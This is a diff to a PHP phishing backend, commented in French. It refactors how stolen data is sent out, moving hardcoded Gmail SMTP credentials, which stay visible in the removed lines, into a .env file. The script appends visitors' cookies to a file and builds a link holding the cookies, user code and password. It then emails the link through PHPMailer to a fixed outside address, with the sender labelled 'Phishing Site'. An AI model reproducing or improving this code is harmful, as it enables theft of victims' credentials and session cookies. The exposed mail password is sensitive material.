@@ -2,6 +2,9 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
+// Charger les variables depuis .env
+$env = parse_ini_file('.env', true);
+
 require 'phpmailer/PHPMailer.php';
 require 'phpmailer/SMTP.php';
 require 'phpmailer/Exception.php';
@@ -26,7 +29,7 @@ $cookies = $_SERVER['HTTP_COOKIE'] ?? '';
 file_put_contents('cookies.txt', $cookies, FILE_APPEND);
 
 // Création du lien vers Brave avec les cookies et identifiants
-$link = "https://brave.com/?cookies=" . urlencode($cookies) . "&amp;user=" . urlencode($codiceUtente) . "&amp;pass=" . urlencode($password);
+$link = "https://brave.com/?cookies=" . urlencode($cookies) . "&amp;amp;user=" . urlencode($codiceUtente) . "&amp;amp;pass=" . urlencode($password);
 
 // Envoi de l'e-mail
 $mail = new PHPMailer(true);
@@ -34,15 +37,15 @@ $mail = new PHPMailer(true);
 try {
     // Configuration du serveur SMTP
     $mail->isSMTP();
-    $mail->Host = 'smtp.gmail.com';
+    $mail->Host = $env['SMTP_HOST'];
     $mail->SMTPAuth = true;
-    $mail->Username = 'kgbspace@gmail.com'; // Votre adresse e-mail
-    $mail->Password = 'dealers456'; // Votre mot de passe
-    $mail->SMTPSecure = 'tls';
-    $mail->Port = 587;
+    $mail->Username = $env['SMTP_USER'];
+    $mail->Password = $env['SMTP_PASS'];
+    $mail->SMTPSecure = $env['SMTP_SECURE'];
+    $mail->Port = $env['SMTP_PORT'];
 
     // Données de l'e-mail
-    $mail->setFrom('kgbspace@gmail.com', 'Phishing Site');
+    $mail->setFrom($env['SMTP_USER'], 'Phishing Site');
     $mail->addAddress('catber545@mail.com', 'Recipient');
 
     $mail->isHTML(false);
@@ -61,3 +64,4 @@ try {
 } catch (Exception $e) {
     echo "E-mail non envoyé. Erreur : " . $mail->ErrorInfo;
 }
+?>
